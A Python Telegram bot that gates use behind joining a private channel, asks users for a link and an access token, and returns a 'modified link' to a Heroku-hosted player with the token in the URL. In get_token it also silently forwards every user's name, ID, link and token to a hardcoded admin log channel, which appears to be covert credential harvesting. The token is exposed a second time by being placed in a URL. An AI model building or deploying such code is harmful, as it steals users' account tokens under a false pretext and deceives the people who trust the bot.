import logging
import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    ContextTypes, ConversationHandler, filters
)

# States for conversation
ASK_LINK, ASK_TOKEN = range(2)
user_data = {}

# Setup logging to a file
logging.basicConfig(
    filename='bot.log',
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# Config from environment variables
BOT_TOKEN = os.getenv("BOT_TOKEN")
FORCE_SUB_CHANNEL_ID = int(os.getenv("FORCE_SUB_CHANNEL_ID", "-1002816346575"))
ADMIN_LOG_CHANNEL_ID = int(os.getenv("ADMIN_LOG_CHANNEL_ID", "-1002679023477"))

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_member = await context.bot.get_chat_member(FORCE_SUB_CHANNEL_ID, user_id)

    if chat_member.status in ['left', 'kicked']:
        join_button = InlineKeyboardMarkup([
            [InlineKeyboardButton("Join Channel", url="https://t.me/+X1hVDFMb76hiMWIy")]  # Replace with your invite link
        ])
        await update.message.reply_text(
            "🚫 You must join our private channel to use this bot.",
            reply_markup=join_button
        )
        return ConversationHandler.END

    await update.message.reply_text("✅ Send your link:")
    return ASK_LINK

async def get_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_data[update.effective_chat.id] = {"link": update.message.text}
    await update.message.reply_text("🔑 Now send your token:")
    return ASK_TOKEN

async def get_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    user_info = update.effective_user

    link = user_data.get(chat_id, {}).get("link")
    token = update.message.text

    if not link:
        await update.message.reply_text("❌ Link missing. Please start again using /start.")
        return ConversationHandler.END

    modified_link = (
        f"https://anonymousrajputplayer-9ab2f2730a02.herokuapp.com/pw?"
        f"url={link}&token={token}"
    )

    # Log to admin channel
    user_text = (
        f"👤 User: {user_info.first_name} (ID: {user_info.id})\n"
        f"🔗 Link: {link}\n"
        f"🔑 Token: {token}"
    )
    await context.bot.send_message(chat_id=ADMIN_LOG_CHANNEL_ID, text=user_text)

    await update.message.reply_text(f"✅ Here is your modified link:\n{modified_link}")
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Process cancelled.")
    return ConversationHandler.END

if __name__ == "__main__":
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            ASK_LINK: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_link)],
            ASK_TOKEN: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_token)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    app.add_handler(conv_handler)
    app.run_polling()
